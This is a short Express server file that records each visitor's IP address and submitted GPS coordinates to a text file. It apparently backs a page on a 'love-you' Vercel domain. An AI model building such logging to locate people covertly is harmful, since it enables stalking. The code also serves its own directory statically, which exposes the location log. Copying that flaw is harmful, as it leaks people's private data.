// server.js

const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();

// --- Configuration ---
// Vercel/Render set the port dynamically using the environment variable PORT.
// If not set (like when testing locally), it defaults to 3000.
const port = process.env.PORT || 3000; 
const logFilePath = 'locations.txt';

// --- Middleware ---
// Allows Express to read the body of the POST request (JSON data).
app.use(bodyParser.json());

// Crucial for deployment on platforms like Vercel and Render.
// It allows requests from your Vercel domain to be processed.
app.use((req, res, next) => {
    // Replace the URL below with YOUR actual Vercel domain: 
    const allowedOrigins = ['https://love-you-two-gamma.vercel.app']; 
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
    }
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// --- Endpoint to Receive Location Data ---
// This endpoint must match the 'destination' in your vercel.json rewrite rule.
app.post('/save-location', (req, res) => {
    const data = req.body;
    
    // Attempt to get the real IP address, especially behind Vercel/proxies
    const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    if (data.latitude && data.longitude) {
        const timestamp = new Date().toISOString();
        const logEntry = `\n--- NEW ENTRY ---\nTimestamp: ${timestamp}\nIP: ${clientIP}\nLatitude: ${data.latitude}\nLongitude: ${data.longitude}\nAccuracy: ${data.accuracy} meters\n`;

        // Append the data to the log file
        fs.appendFile(logFilePath, logEntry, (err) => {
            if (err) {
                console.error('Failed to write to log file:', err);
                // Send a non-critical error response back
                return res.status(500).json({ status: 'error', message: 'Failed to log location internally.' });
            }
            console.log('Successfully logged location data.');
            res.json({ status: 'success', message: 'Location received and logged.' });
        });
    } else {
        // Handle case where required data is missing
        res.status(400).json({ status: 'error', message: 'Missing latitude or longitude.' });
    }
});

// --- Start the Server ---
app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
});

// --- Optional: Serve Static Files (Vercel overrides this, but good practice) ---
// Vercel's static file serving is better, but this is here for local testing.
app.use(express.static('.'));
